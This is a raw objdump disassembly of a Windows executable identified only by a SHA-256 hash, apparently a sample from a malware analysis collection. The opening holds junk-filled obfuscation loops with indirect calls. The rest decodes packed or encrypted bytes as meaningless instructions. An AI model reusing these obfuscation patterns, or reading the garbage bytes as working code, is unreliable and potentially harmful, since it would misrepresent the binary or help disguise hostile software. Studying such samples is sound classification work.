
ae6f11b8c564c65cb0cd300fe75e57b52883f36b1e5c3136d47520fb004806a7.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc9e
  40100b:	movzx  ecx,BYTE PTR ds:0x42fd0d
  401012:	mov    DWORD PTR [ebp-0x20],eax
  401015:	mov    ecx,DWORD PTR [ebp-0x20]
  401018:	mov    DWORD PTR [ebp-0x24],0x4ec5
  40101f:	mov    DWORD PTR ds:0x42fd09,0x6cee
  401029:	cmp    ecx,eax
  40102b:	mov    DWORD PTR ds:0x42e11c,0x6120
  401035:	jne    0x402968
  40103b:	or     ecx,0x42d0
  401041:	mov    ax,WORD PTR [ebp-0x24]
  401045:	adc    DWORD PTR ds:0x42fcf1,edx
  40104b:	push   esi
  40104c:	and    DWORD PTR ds:0x42fcd9,0x0
  401056:	jmp    0x401068
  40105b:	mov    ecx,DWORD PTR ds:0x42fcd9
  401061:	inc    ecx
  401062:	mov    DWORD PTR ds:0x42fcd9,ecx
  401068:	cmp    DWORD PTR ds:0x42fcd9,0x1a
  40106f:	jae    0x4010b5
  401075:	cmp    DWORD PTR ds:0x42fcd9,0xf
  40107c:	jne    0x401090
  401082:	push   0x23a3
  401087:	push   DWORD PTR [ebp-0x10]
  40108a:	call   DWORD PTR ds:0x42e527
  401090:	cmp    DWORD PTR ds:0x42fcd9,0xe
  401097:	jne    0x4010aa
  40109d:	mov    ecx,DWORD PTR ds:0x42fcd9
  4010a3:	inc    ecx
  4010a4:	mov    DWORD PTR ds:0x42fcd9,ecx
  4010aa:	jmp    0x40105b
  4010af:	add    DWORD PTR ds:0x42e124,edx
  4010b5:	mov    ecx,0x8a3e
  4010ba:	xor    ax,cx
  4010bd:	sub    ecx,DWORD PTR ds:0x42e70b
  4010c3:	mov    ecx,DWORD PTR [ebp+0x8]
  4010c6:	mov    DWORD PTR ds:0x42e6fb,0x11
  4010d0:	cmp    DWORD PTR ds:0x42e6fb,0x0
  4010d7:	je     0x4011ef
  4010dd:	cmp    DWORD PTR ds:0x42e6fb,0x8
  4010e4:	jne    0x401100
  4010ea:	push   0x42e128
  4010ef:	push   DWORD PTR [ebp-0x10]
  4010f2:	push   0x671d
  4010f7:	push   DWORD PTR [ebp-0x20]
  4010fa:	call   DWORD PTR ds:0x42e2cf
  401100:	cmp    DWORD PTR ds:0x42e6fb,0x9
  401107:	jne    0x40111c
  40110d:	xor    esi,esi
  40110f:	xor    esi,DWORD PTR ds:0x42e6fb
  401115:	dec    esi
  401116:	mov    DWORD PTR ds:0x42e6fb,esi
  40111c:	mov    esi,DWORD PTR ds:0x42e6fb
  401122:	dec    esi
  401123:	mov    DWORD PTR ds:0x42e6fb,esi
  401129:	jmp    0x4010d0
  40112e:	and    DWORD PTR ds:0x42e11c,0x0
  401138:	mov    esi,DWORD PTR ds:0x42e11c
  40113e:	inc    esi
  40113f:	mov    DWORD PTR ds:0x42e11c,esi
  401145:	cmp    DWORD PTR ds:0x42e11c,0xd
  40114c:	jne    0x401160
  401152:	push   0x3999
  401157:	push   DWORD PTR [ebp-0x20]
  40115a:	call   DWORD PTR ds:0x42e52b
  401160:	cmp    DWORD PTR ds:0x42e11c,0xc
  401167:	jne    0x40117c
  40116d:	xor    esi,esi
  40116f:	add    esi,DWORD PTR ds:0x42e11c
  401175:	inc    esi
  401176:	mov    DWORD PTR ds:0x42e11c,esi
  40117c:	cmp    DWORD PTR ds:0x42e11c,0x15
  401183:	jb     0x401138
  401189:	mov    DWORD PTR ds:0x42e134,0x1a
  401193:	cmp    DWORD PTR ds:0x42e134,0x0
  40119a:	je     0x4011ef
  4011a0:	cmp    DWORD PTR ds:0x42e134,0x25
  4011a7:	jne    0x4011d5
  4011ad:	push   0x42fd7a
  4011b2:	push   DWORD PTR [ebp-0x20]
  4011b5:	push   0x4679
  4011ba:	push   0x42fd82
  4011bf:	push   0x17d1
  4011c4:	push   0x42e227
  4011c9:	push   DWORD PTR [ebp-0x14]
  4011cc:	push   DWORD PTR [ebp-0x18]
  4011cf:	call   DWORD PTR ds:0x42e44b
  4011d5:	xor    esi,esi
  4011d7:	or     esi,DWORD PTR ds:0x42e134
  4011dd:	dec    esi
  4011de:	mov    DWORD PTR ds:0x42e134,esi
  4011e4:	jmp    0x401193
  4011e9:	add    DWORD PTR ds:0x42e6fb,ecx
  4011ef:	push   edi
  4011f0:	xor    esi,esi
  4011f2:	or     esi,DWORD PTR ds:0x42fd05
  4011f8:	adc    esi,DWORD PTR ds:0x42fd09
  4011fe:	mov    DWORD PTR ds:0x42fd05,esi
  401204:	mov    edi,0x3b04
  401209:	add    ax,di
  40120c:	mov    DWORD PTR ds:0x42e703,0x17
  401216:	cmp    DWORD PTR ds:0x42e703,0x0
  40121d:	je     0x401257
  401223:	cmp    DWORD PTR ds:0x42e703,0x26
  40122a:	jne    0x401243
  401230:	push   DWORD PTR [ebp-0x10]
  401233:	push   0x42e1c6
  401238:	push   0x42e17d
  40123d:	call   DWORD PTR ds:0x42e52f
  401243:	xor    esi,esi
  401245:	or     esi,DWORD PTR ds:0x42e703
  40124b:	dec    esi
  40124c:	mov    DWORD PTR ds:0x42e703,esi
  401252:	jmp    0x401216
  401257:	movzx  eax,ax
  40125a:	not    eax
  40125c:	and    eax,DWORD PTR [ecx]
  40125e:	mov    ecx,DWORD PTR [ebp+0x8]
  401261:	mov    DWORD PTR ds:0x42fd7e,0x12
  40126b:	cmp    DWORD PTR ds:0x42fd7e,0x0
  401272:	je     0x4012b2
  401278:	cmp    DWORD PTR ds:0x42fd7e,0x22
  40127f:	jne    0x4012a0
  401285:	push   0x42e227
  40128a:	push   0x7fee
  40128f:	push   DWORD PTR [ebp-0x28]
  401292:	push   DWORD PTR [ebp-0x24]
  401295:	push   0x4b6b
  40129a:	call   DWORD PTR ds:0x42e533
  4012a0:	mov    esi,DWORD PTR ds:0x42fd7e
  4012a6:	dec    esi
  4012a7:	mov    DWORD PTR ds:0x42fd7e,esi
  4012ad:	jmp    0x40126b
  4012b2:	mov    DWORD PTR [ecx],eax
  4012b4:	mov    ecx,0x7510855
  4012b9:	mov    esi,0x32729c
  4012be:	push   ebx
  4012bf:	mov    ax,WORD PTR [ebp-0x24]
  4012c3:	movzx  eax,ax
  4012c6:	mov    DWORD PTR [ebp-0x38],eax
  4012c9:	mov    eax,DWORD PTR [ebp+0x8]
  4012cc:	mov    DWORD PTR [ebp-0x28],eax
  4012cf:	mov    DWORD PTR [ebp-0x8],0xf89c8530
  4012d6:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4012dd:	mov    eax,0x9577
  4012e2:	jmp    0x4014ff
  4012e7:	sbb    BYTE PTR [edx-0x68cdf8d6],0xb1
  4012ee:	cdq    
  4012ef:	js     0x401291
  4012f1:	mov    ah,0x66
  4012f3:	jge    0x40135e
  4012f5:	test   al,0xf9
  4012f7:	jo     0x401369
  4012f9:	jo     0x40136b
  4012fb:	jo     0x40137b
  4012fd:	jo     0x40136f
  4012ff:	rcl    bh,0x3d
  401302:	aad    0x39
  401304:	ror    edi,cl
  401306:	rol    eax,1
  401308:	pop    es
  401309:	push   es
  40130a:	add    ecx,DWORD PTR [edi]
  40130c:	push   ebp
  40130d:	add    cl,BYTE PTR [edi]
  40130f:	xor    ecx,DWORD PTR [edi]
  401311:	ret    0xc71a
  401314:	adc    bl,BYTE PTR [edi]
  401316:	mov    ecx,0xddb7025a
  40131b:	add    bh,ch
  40131d:	mov    ebp,0x8003c8db
  401322:	sbb    BYTE PTR [eax+0x1541a4f6],dh
  401328:	lods   eax,DWORD PTR ds:[esi]
  401329:	sar    BYTE PTR [eax+0x6fee581f],1
  40132f:	or     edx,DWORD PTR [ecx]
  401331:	sahf   
  401332:	jp     0x4012fc
  401334:	inc    edx
  401335:	lods   al,BYTE PTR ds:[esi]
  401336:	push   ebx
  401337:	sub    eax,0xad3ec6d1
  40133c:	mov    WORD PTR [ebx-0x3b],?
  40133f:	stos   DWORD PTR es:[edi],eax
  401340:	js     0x401308
  401342:	rol    DWORD PTR [ecx+0x3992c8f9],cl
  401348:	jmp    0x40137c
  40134a:	mov    ebp,ecx
  40134c:	dec    edi
  40134d:	fcomp  DWORD PTR [eax-0x656800bf]
  401353:	pop    es
  401354:	test   eax,0xed4dbddc
  401359:	sub    BYTE PTR [ebp+0x23],dl
  40135c:	mov    ah,0xec
  40135e:	pusha  
  40135f:	nop
  401360:	mov    esi,0x94c3117b
  401365:	and    esi,edx
  401367:	jmp    0x4013b9
  401369:	(bad)  
  40136a:	out    0xba,al
  40136c:	repnz in al,dx
  40136e:	xchg   esp,eax
  40136f:	xor    edi,ecx
  401371:	jbe    0x4013d8
  401373:	xlat   BYTE PTR ds:[ebx]
  401374:	and    cl,ch
  401376:	add    al,0xd9
  401378:	adc    DWORD PTR [ecx-0x68],edx
  40137b:	xor    eax,0x7a616f03
  401380:	or     dh,BYTE PTR [ecx]
  401382:	fld    QWORD PTR [eax+0x7f752a56]
  401388:	xor    BYTE PTR [edi+0xba8db0c],cl
  40138e:	pop    ebx
  40138f:	push   ebp
  401390:	(bad)  
  401392:	or     ebx,edx
  401394:	pop    esi
  401395:	fstp   DWORD PTR [ecx]
  401397:	jno    0x401329
  401399:	mov    eax,0x2b15374b
  40139e:	ja     0x4013c9
  4013a0:	sbb    al,0xd3
  4013a2:	xor    BYTE PTR [edi-0x16],cl
  4013a5:	int    0xa6
  4013a7:	rol    BYTE PTR [ecx-0x258fbb65],cl
  4013ad:	pusha  
  4013ae:	and    DWORD PTR [edi+0xa],eax
  4013b1:	mov    ah,0x69
  4013b3:	push   cs
  4013b4:	jge    0x40142e
  4013b6:	inc    esp
  4013b7:	jl     0x401424
  4013b9:	mov    esi,fs
  4013bb:	push   0xffffffa0
  4013bd:	bound  ecx,QWORD PTR [esp+ecx*8-0x274c90ef]
  4013c4:	mul    BYTE PTR [ebx]
  4013c6:	sbb    al,0x29
  4013c8:	(bad)  
  4013c9:	pop    eax
  4013ca:	xor    dl,BYTE PTR [edi]
  4013cc:	test   BYTE PTR [ebp-0x73],dl
  4013cf:	mov    ebp,0x58670b65
  4013d4:	cld    
  4013d5:	sti    
  4013d6:	mov    dl,0xbf
  4013d8:	add    bl,ah
  4013da:	aad    0x3c
  4013dc:	inc    ebp
  4013dd:	xchg   esp,eax
  4013de:	jp     0x401398
  4013e0:	dec    edi
  4013e1:	push   ebx
  4013e2:	add    al,ah
  4013e4:	test   edi,ebx
  4013e6:	jno    0x401379
  4013e8:	push   0xffffff94
  4013ea:	fld    TBYTE PTR [edi]
  4013ec:	and    cl,bl
  4013ee:	(bad)  
  4013ef:	dec    esp
  4013f0:	out    dx,eax
  4013f1:	bound  ebp,QWORD PTR [ebp-0x35]
  4013f4:	sbb    al,BYTE PTR [ebx]
  4013f6:	xor    al,0x3e
  4013f8:	frstor [esi+0x7e]
  4013fb:	scas   eax,DWORD PTR es:[edi]
  4013fc:	mov    BYTE PTR [eax+0x4],ah
  4013ff:	inc    ebx
  401400:	mov    cl,0x1e
  401402:	out    dx,eax
  401403:	imul   ebx,DWORD PTR [edx+0x994dd7d],0x53
  40140a:	fs and eax,0xb3055946
  401410:	sbb    edi,esi
  401412:	dec    edi
  401413:	fimul  DWORD PTR [ebp+edx*1-0x56]
  401417:	inc    edx
  401418:	inc    ebp
  401419:	clc    
  40141a:	jb     0x401458
  40141c:	in     al,dx
  40141d:	leave  
  40141e:	or     eax,0xd2cb8ac3
  401423:	rol    ebp,cl
  401425:	add    al,BYTE PTR [edi]
  401427:	mov    ebp,0xe53e5fd
  40142c:	repnz or edx,DWORD PTR [edx-0x55]
  401430:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401431:	push   cs
  401432:	aad    0x38
  401434:	pop    edx
  401435:	sbb    dl,BYTE PTR [eax]
  401437:	fisub  DWORD PTR [ebx-0x26]
  40143a:	adc    DWORD PTR [eax-0x6c64bee9],edx
  401440:	adc    DWORD PTR [esi+0x1a5c3edc],0xffffffcb
  401447:	mov    ch,0xd
  401449:	lods   eax,DWORD PTR ds:[esi]
  40144a:	xchg   ebp,eax
  40144b:	lahf   
  40144c:	inc    ebx
  40144d:	push   cs
  40144e:	push   0xffffffd4
  401450:	cdq    
  401451:	aam    0x8b
  401453:	cmp    eax,0xc1af2c58
  401458:	lods   eax,DWORD PTR ds:[esi]
  401459:	add    eax,0x5a0337a2
  40145e:	jno    0x4014db
  401460:	pusha  
  401461:	adc    al,0x23
  401463:	ins    DWORD PTR es:[edi],dx
  401464:	lods   eax,DWORD PTR ds:[esi]
  401465:	inc    esp
  401466:	cmp    dh,BYTE PTR ds:0x959d7fe5
  40146c:	aam    0x6e
  40146e:	mov    fs,WORD PTR [esi]
  401470:	adc    edi,edx
  401472:	lods   al,BYTE PTR ds:[esi]
  401473:	fiadd  DWORD PTR [esi-0x2d82088c]
  401479:	int    0xbf
  40147b:	out    0x50,al
  40147d:	cmp    dh,BYTE PTR [edi]
  40147f:	call   0x63c7:0x5bb0d6e8
  401486:	iret   
  401487:	or     eax,0x6371afdf
  40148c:	sahf   
  40148d:	adc    edx,DWORD PTR [edx]
  40148f:	mov    bh,0xec
  401491:	test   DWORD PTR [ebp-0x26],ecx
  401494:	out    dx,al
  401495:	daa    
  401496:	popf   
  401497:	mov    ebx,0xc5422fdb
  40149c:	in     eax,dx
  40149d:	popa   
  40149e:	sbb    DWORD PTR [ebx],esi
  4014a0:	inc    ebp
  4014a1:	shl    DWORD PTR [ebx+0xdaf6d63],cl
  4014a7:	pop    ebx
  4014a8:	push   es
  4014a9:	mov    al,0x9b
  4014ab:	mov    dh,0xd6
  4014ad:	pushf  
  4014ae:	or     ecx,DWORD PTR [esi+ecx*4]
  4014b1:	sub    DWORD PTR [ecx],0xffffff9b
  4014b4:	arpl   WORD PTR [ebx+0x9],ax
  4014b7:	inc    edx
  4014b8:	and    cl,al
  4014ba:	mov    edx,0x8a54be5f
  4014bf:	cmp    cl,BYTE PTR [ebp-0x8]
  4014c2:	add    eax,0x94bf10ff
  4014c7:	pop    ebx
  4014c8:	inc    edi
  4014c9:	repz mov al,cl
  4014cc:	shl    esi,0x28
  4014cf:	mov    ah,0xb7
  4014d1:	jl     0x4014e2
  4014d3:	xchg   edi,eax
  4014d4:	cmp    DWORD PTR [edi+0x2f61a003],0xffffff98
  4014db:	jnp    0x4014f7
  4014dd:	xchg   ebp,eax
  4014de:	retf   
  4014df:	fldcw  WORD PTR [eax+eax*1+0x450d0c6c]
  4014e6:	dec    ebp
  4014e7:	sbb    edi,DWORD PTR [ecx]
  4014e9:	push   eax
  4014ea:	retf   0x6788
  4014ed:	xchg   edx,eax
  4014ee:	push   eax
  4014ef:	jecxz  0x40156b
  4014f1:	jge    0x401509
  4014f3:	xor    eax,0xcd986fc0
  4014f8:	push   cs
  4014f9:	mov    edx,0xc25b1c5a
  4014fe:	add    al,0x66
  401500:	mov    DWORD PTR [ebp-0x4],eax
  401503:	jmp    0x401720
  401508:	clc    
  401509:	icebp  
  40150a:	mov    esp,0xb8b16984
  40150f:	icebp  
  401510:	ficomp DWORD PTR [edx-0x1d75e013]
  401516:	push   ss
  401517:	inc    eax
  401518:	jo     0x401598
  40151a:	jo     0x40158c
  40151c:	jo     0x40159c
  40151e:	jo     0x401590
  401520:	call   0x626b0169
  401525:	aad    0x55
  401527:	test   DWORD PTR [ebx-0x10],edx
  40152a:	stc    
  40152b:	stos   BYTE PTR es:[edi],al
  40152c:	pushf  
  40152d:	ja     0x40154f
  40152f:	inc    ebp
  401530:	pop    ds
  401531:	(bad)  
  401532:	cmp    DWORD PTR [ebp-0x21da768b],ebx
  401538:	jnp    0x401547
  40153a:	push   ebx
  40153b:	xchg   edi,eax
  40153c:	mov    ds:0xa5fad88d,al
  401541:	ficom  DWORD PTR es:[ecx-0x46]
  401545:	es adc eax,0xa106bb28
  40154b:	fild   DWORD PTR [ebp-0x4d]
  40154e:	idiv   DWORD PTR [edx-0xa]
  401551:	daa    
  401552:	cmp    al,0xf5
  401554:	dec    esp
  401555:	xor    BYTE PTR [eax+0x2bf5db4e],dh
  40155b:	xchg   ebp,eax
  40155c:	shl    DWORD PTR [ebx+0x45a99b93],cl
  401562:	and    al,0xe5
  401564:	push   edx
  401565:	jae    0x40158a
  401567:	inc    ebp
  401568:	pop    ecx
  401569:	ins    BYTE PTR es:[edi],dx
  40156a:	in     eax,dx
  40156b:	xor    DWORD PTR [edx],eax
  40156d:	mov    bh,0x90
  40156f:	ret    
  401570:	adc    cl,al
  401572:	mov    eax,ds:0x53f78de0
  401577:	rol    DWORD PTR [ebx-0x7],0x72
  40157b:	and    eax,ecx
  40157d:	jg     0x401514
  40157f:	bound  esi,QWORD PTR [edx-0x4d]
  401582:	popa   
  401583:	jno    0x40157b
  401585:	cmc    
  401586:	push   0x579871c5
  40158b:	mov    ch,0x25
  40158d:	or     ecx,DWORD PTR [esi+edx*1]
  401590:	mov    ebx,0x5d40a1ce
  401595:	lods   eax,DWORD PTR ds:[esi]
  401596:	clc    
  401597:	cdq    
  401598:	dec    ebx
  401599:	out    0x95,eax
  40159b:	mov    ds:0x158a0a88,al
  4015a0:	lds    esi,FWORD PTR [ebx-0x4c8724e]
  4015a6:	ret    
  4015a7:	and    ecx,DWORD PTR ds:0xd8c11ade
  4015ad:	(bad)  
  4015ae:	jne    0x4015f1
  4015b0:	lea    eax,[ebx-0x6f06f588]
  4015b6:	adc    ch,BYTE PTR [esi+edx*4]
  4015b9:	sbb    DWORD PTR [edx-0x50],esp
  4015bc:	cmp    BYTE PTR [ebx+ebp*2+0x68],dh
  4015c0:	push   esi
  4015c1:	and    eax,0x5fd51ec9
  4015c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4015c7:	int3   
  4015c8:	scas   al,BYTE PTR es:[edi]
  4015c9:	test   DWORD PTR [esi],esp
  4015cb:	sub    BYTE PTR [ebp-0x58],0xb
  4015cf:	iret   
  4015d0:	inc    ecx
  4015d1:	push   ecx
  4015d2:	mov    ds:0xfe1ec338,al
  4015d7:	jg     0x40155c
  4015d9:	mov    ebp,0xf3a75189
  4015de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4015df:	cld    
  4015e0:	pusha  
  4015e1:	popa   
  4015e2:	cdq    
  4015e3:	jnp    0x401594
  4015e5:	das    
  4015e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4015e7:	jb     0x4015a7
  4015e9:	push   0x30b2a3d5
  4015ee:	mov    esp,0x267b0e00
  4015f4:	fsubr  st(2),st
  4015f6:	lds    esi,FWORD PTR [esi+eax*4]
  4015f9:	pop    edx
  4015fa:	enter  0x2122,0xbb
  4015fe:	ins    BYTE PTR es:[edi],dx
  4015ff:	leave  
  401600:	in     al,dx
  401601:	ret    
  401602:	es jae 0x40167f
  401605:	xor    ah,al
  401607:	sub    al,BYTE PTR [ebx-0x31]
  40160a:	fsub   DWORD PTR [ebx-0x1629f3b]
  401610:	(bad)  
  401611:	ja     0x40165b
  401613:	or     al,0x5
  401615:	cwde   
  401616:	stc    
  401617:	cmp    bh,BYTE PTR [edx-0x7d0f6e51]
  40161d:	iret   
  40161e:	rcl    BYTE PTR [ecx+edx*8-0x4b],1
  401622:	sbb    al,0xe3
  401624:	dec    esp
  401625:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401626:	je     0x4015f9
  401628:	mov    cl,0x26
  40162a:	adc    BYTE PTR [esi],cl
  40162c:	xchg   ecx,eax
  40162d:	dec    ebx
  40162e:	outs   dx,DWORD PTR ds:[esi]
  40162f:	jns    0x401654
  401631:	icebp  
  401632:	pop    ds
  401633:	mov    dh,0x22
  401635:	aad    0x41
  401637:	sbb    BYTE PTR [edi-0x17],bl
  40163a:	adc    al,0xfc
  40163c:	lahf   
  40163d:	pop    ebp
  40163e:	add    BYTE PTR [edx-0x1e],dl
  401641:	mov    eax,0xd1f82f2
  401646:	sub    esp,eax
  401648:	test   BYTE PTR [ecx+0x2f],bl
  40164b:	mov    eax,ds:0x4f256ff7
  401650:	aas    
  401651:	fdiv   QWORD PTR [edx+0x45]
  401654:	push   cs
  401655:	mov    WORD PTR [ebp-0x6d540686],fs
  40165b:	in     eax,dx
  40165c:	fwait
  40165d:	shl    DWORD PTR [eax+0x24],1
  401660:	mov    bh,dl
  401662:	js     0x4016a8
  401664:	adc    esp,DWORD PTR [esi*4+0x755264f4]
  40166b:	cmp    DWORD PTR [ebp-0x5df4b456],edx
  401671:	inc    ebx
  401672:	add    ch,BYTE PTR [ecx+0x142d33f8]
  401678:	xchg   BYTE PTR [eax-0x462706bf],al
  40167e:	jns    0x401681
  401680:	repnz popa 
  401682:	jecxz  0x4016a5
  401684:	dec    eax
  401685:	stos   DWORD PTR es:[edi],eax
  401686:	jp     0x4016ce
  401688:	loop   0x4016b7
  40168a:	xor    DWORD PTR [esi+0x6de99e74],ebx
  401690:	jmp    0x9d33:0x4049509c
  401697:	cmp    al,0x36
  401699:	xchg   ebx,eax
  40169a:	rcl    DWORD PTR [edx+0x39],cl
  40169d:	(bad)  
  40169e:	nop
  40169f:	lahf   
  4016a0:	jmp    0x5feadc2
  4016a5:	add    ah,dh
  4016a7:	jmp    0x69d3efb4
  4016ac:	fisubr WORD PTR [eax]
  4016ae:	pop    ecx
  4016af:	out    dx,al
  4016b0:	sub    dh,BYTE PTR [ebx+0x7d9eb7bc]
  4016b6:	inc    ebx
  4016b7:	and    ebp,edi
  4016b9:	mov    DWORD PTR [edx+esi*1+0x3e08a3c3],ecx
  4016c0:	in     al,0xca
  4016c2:	pop    edx
  4016c3:	test   al,0x55
  4016c5:	nop
  4016c6:	push   0xffffff86
  4016c8:	push   ss
  4016c9:	fwait
  4016ca:	mov    dl,0xd2
  4016cc:	mov    dh,ch
  4016ce:	imul   edi,DWORD PTR [ebx+0x8],0x52
  4016d2:	daa    
  4016d3:	add    BYTE PTR [ebx+0x13],al
  4016d6:	gs xchg ebx,eax
  4016d8:	adc    BYTE PTR [eax+eax*2],al
  4016db:	or     DWORD PTR [edi],eax
  4016dd:	enter  0x4e3d,0x28
  4016e1:	test   eax,0x4611db87
  4016e6:	push   ecx
  4016e7:	sub    DWORD PTR [eax],ecx
  4016e9:	(bad)  
  4016ea:	cmp    al,0x1c
  4016ec:	pop    esp
  4016ed:	mov    ss,eax
  4016ef:	jmp    0x1b285db0
  4016f4:	je     0x401702
  4016f6:	loopne 0x4016fa
  4016f8:	mov    ds:0x2b0d3938,eax
  4016fd:	inc    eax
  4016fe:	adc    eax,0x50277738
  401703:	dec    esi
  401704:	push   es
  401705:	popa   
  401706:	test   al,0x3a
  401708:	sbb    esi,ebp
  40170a:	inc    edi
  40170b:	sbb    al,0x83
  40170d:	loop   0x401692
  40170f:	dec    esp
  401710:	outs   dx,DWORD PTR ds:[esi]
  401711:	inc    esi
  401712:	int    0xc6
  401714:	dec    esi
  401715:	jg     0x40169f
  401717:	pop    ds
  401718:	push   esi
  401719:	or     bh,BYTE PTR [ebp+0x2010ea00]
  40171f:	mov    ebp,0x89d0458d
  401724:	inc    ebp
  401725:	int3   
  401726:	mov    eax,DWORD PTR [ebp-0x28]
  401729:	mov    DWORD PTR [ebp-0x2c],eax
  40172c:	lea    eax,[ebp-0x18]
  40172f:	jmp    0x40194c
  401734:	dec    ebp
  401735:	iret   
  401736:	lods   eax,DWORD PTR ds:[esi]
  401737:	dec    ebx
  401738:	lods   eax,DWORD PTR ds:[esi]
  401739:	imul   ebp,DWORD PTR [ecx-0x37],0x8e1037e1
  401740:	dec    esi
  401741:	data16 sbb BYTE PTR [esi+0x70],bl
  401745:	jl     0x4017b7
  401747:	jo     0x4017b9
  401749:	jle    0x4017bb
  40174b:	jo     0x4017ac
  40174d:	jns    0x4017ac
  40174f:	(bad)  
  401750:	mov    bl,0x4f
  401752:	cmp    eax,0x44f39d61
  401757:	push   edi
  401758:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401759:	imul   edi,edi,0x372483c1
  40175f:	out    dx,eax
  401760:	cdq    
  401761:	mov    BYTE PTR [eiz*1+0x38016f50],dh
  401768:	xor    ebx,ebp
  40176a:	rcr    cl,0xd5
  40176d:	retf   
  40176e:	idiv   BYTE PTR [ebx+0x46]
  401771:	xchg   esp,eax
  401772:	jae    0x4017b5
  401774:	lods   eax,DWORD PTR ds:[esi]
  401775:	jmp    0x40176c
  401777:	outs   dx,DWORD PTR ds:[esi]
  401778:	dec    edx
  401779:	data16 cld 
  40177b:	mov    ebp,0x8cc87167
  401780:	mov    WORD PTR [bp+di-0x4594],?
  401785:	push   es
  401786:	pop    eax
  401787:	(bad)  
  401788:	adc    eax,0xbf42c1b1
  40178d:	mov    ds:0xab739635,al
  401792:	sbb    BYTE PTR [bx+di+0xa],bl
  401796:	rcl    DWORD PTR [edi],0x43
  401799:	jecxz  0x4017b2
  40179b:	mov    ecx,0x5cf9445c
  4017a0:	jmp    0xd58c9cab
  4017a5:	data16 and al,0x99
  4017a8:	out    0x5d,eax
  4017aa:	xchg   esp,eax
  4017ab:	and    al,0xe7
  4017ad:	xor    al,0x96
  4017af:	mov    bh,0xd9
  4017b1:	pop    edx
  4017b2:	jl     0x4017a4
  4017b4:	fistp  WORD PTR [ecx+0x1184d4ce]
  4017ba:	adc    ah,BYTE PTR [eax+ebp*1+0x7425bf86]
  4017c1:	sub    BYTE PTR [ebx],0x5c
  4017c4:	bound  esp,QWORD PTR [edx]
  4017c6:	xchg   ebx,eax
  4017c7:	mov    al,ds:0xe3d027b5
  4017cc:	pop    ebp
  4017cd:	xor    ah,dh
  4017cf:	pmovmskb esi,mm2
  4017d2:	pop    esi
  4017d3:	dec    edx
  4017d4:	pop    ebx
  4017d5:	inc    esi
  4017d6:	dec    edi
  4017d7:	test   eax,0x17835b78
  4017dc:	lds    edx,FWORD PTR [esi+0x43daef4e]
  4017e2:	sbb    ecx,edx
  4017e4:	pop    ebx
  4017e5:	sub    DWORD PTR [esp+ebx*2-0x71030c03],esp
  4017ec:	or     al,BYTE PTR [ecx+eiz*4-0x250401c1]
  4017f3:	lock xor al,BYTE PTR [ebx-0x15]
  4017f7:	jge    0x40186f
  4017f9:	(bad)  
  4017fa:	mov    esi,0xea9f547e
  4017ff:	sahf   
  401800:	stc    
  401801:	lahf   
  401802:	mov    cs,ecx
  401804:	sub    ebx,esp
  401806:	inc    edi
  401807:	out    dx,eax
  401808:	xchg   edi,eax
  401809:	push   ebp
  40180a:	test   dh,bh
  40180c:	cdq    
  40180d:	mov    esi,0x8797d7f
  401812:	(bad)  
  401813:	sbb    BYTE PTR [edi-0x5b],al
  401816:	xchg   DWORD PTR [ebp-0x66eee27c],ebp
  40181c:	lea    esi,es:[eax+0x14e2fc8a]
  401823:	jno    0x40188a
  401825:	cwde   
  401826:	jns    0x401857
  401828:	cwde   
  401829:	rol    BYTE PTR [ebp+0x21632dd4],1
  40182f:	and    eax,0x9c753a73
  401834:	xchg   ecx,eax
  401835:	dec    esi
  401836:	stc    
  401837:	sub    DWORD PTR [esi+0x3212f97c],ebp
  40183d:	out    0x92,al
  40183f:	pushf  
  401840:	pop    edx
  401841:	(bad)  
  401842:	bound  esi,QWORD PTR [edx+ebx*2]
  401845:	(bad)  
  401846:	mov    ah,BYTE PTR [edi+ebp*4]
  401849:	stos   DWORD PTR es:[edi],eax
  40184a:	pop    esi
  40184b:	ins    BYTE PTR es:[edi],dx
  40184c:	adc    eax,0xd7fd0d81
  401851:	jne    0x401873
  401853:	loopne 0x4017d6
  401855:	neg    BYTE PTR [esi+edx*2+0x2e]
  401859:	sub    al,0x61
  40185b:	pop    edx
  40185c:	mov    dl,0x59
  40185e:	mov    ds:0x4d877b56,al
  401863:	pop    eax
  401864:	in     al,dx
  401865:	or     edi,edx
  401867:	dec    eax
  401868:	mov    al,ds:0x5a7a2c54
  40186d:	fs call 0x5399e919
  401873:	loope  0x40189d
  401875:	push   0xffffffdd
  401877:	mov    DWORD PTR [ebp-0x7b],ecx
  40187a:	adc    DWORD PTR [ebp-0x52],0x3f
  40187e:	xlat   BYTE PTR ds:[ebx]
  40187f:	add    eax,0x6735dd23
  401884:	mov    ss,WORD PTR [edx]
  401886:	les    ecx,FWORD PTR [ebx+ebx*8-0x39c82da6]
  40188d:	stos   BYTE PTR es:[edi],al
  40188e:	shl    ecx,0x47
  401891:	fsub   st(1),st
  401893:	inc    esi
  401894:	hlt    
  401895:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401896:	sbb    al,0xa0
  401898:	in     al,dx
  401899:	xchg   DWORD PTR [ebp-0x1f1729d2],esi
  40189f:	hlt    
  4018a0:	xor    eax,0xe3371ce3
  4018a5:	je     0x4018da
  4018a7:	rcr    BYTE PTR [ecx-0x56],0xfc
  4018ab:	cmc    
  4018ac:	lods   al,BYTE PTR ds:[esi]
  4018ad:	xor    bh,dl
  4018af:	ds ret 0x8f68
  4018b3:	cmovl  esi,DWORD PTR [edi-0x1a198f70]
  4018ba:	out    dx,eax
  4018bb:	gs retf 
  4018bd:	cmp    BYTE PTR [edi-0x2a7f8398],0x4e
  4018c4:	aas    
  4018c5:	daa    
  4018c6:	fdivr  st(2),st
  4018c8:	mov    esi,0x861dca82
  4018cd:	adc    eax,edi
  4018cf:	jae    0x40189e
  4018d1:	stc    
  4018d2:	out    dx,eax
  4018d3:	or     ch,ah
  4018d5:	pop    ds
  4018d6:	jae    0x40185a
  4018d8:	mov    edx,DWORD PTR [eax-0x6d260b12]
  4018de:	aas    
  4018df:	or     eax,0x6e3ad1ef
  4018e4:	sbb    DWORD PTR ds:0xb3699fd1,esp
